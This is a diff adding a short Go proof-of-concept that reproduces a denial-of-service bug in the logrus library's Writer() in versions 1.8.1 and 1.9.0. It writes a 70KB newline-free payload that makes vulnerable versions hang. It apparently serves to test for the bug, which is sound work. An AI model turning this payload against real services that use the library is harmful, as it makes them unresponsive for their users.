@@ -1,0 +1,43 @@
+package main
+
+import (
+    "bytes"
+    "fmt"
+    "time"
+
+    "github.com/sirupsen/logrus"
+)
+
+// Standalone PoC for the logrus Writer() DoS in v1.8.1 (and v1.9.0):
+// Logs a single >64KB line without newlines via Writer(), which causes the
+// process to hang or become unresponsive in vulnerable versions.
+//
+// Usage:
+//   go mod init poclogrus
+//   go get github.com/sirupsen/logrus@v1.8.1
+//   go run poc_logrus_dos.go
+//
+// Expected in vulnerable versions:
+// - The program hangs or prints a scanner error and stalls (DoS condition).
+// - No graceful completion.
+func main() {
+    logger := logrus.New()
+
+    // Obtain a Writer() that feeds into logrus' bufio.Scanner pipeline
+    w := logger.Writer()
+    defer w.Close()
+
+    // Create a 70KB payload without newlines
+    payload := bytes.Repeat([]byte("A"), 70000)
+
+    fmt.Println("writing 70KB single-line payload to logrus.Writer() ...")
+    if _, err := w.Write(payload); err != nil {
+        fmt.Println("write error:", err)
+    }
+
+    // Give the background scanner time to process (and hang in vulnerable versions)
+    time.Sleep(5 * time.Second)
+    fmt.Println("if you see this and the program exits, you may be on a patched version")
+}
+
+
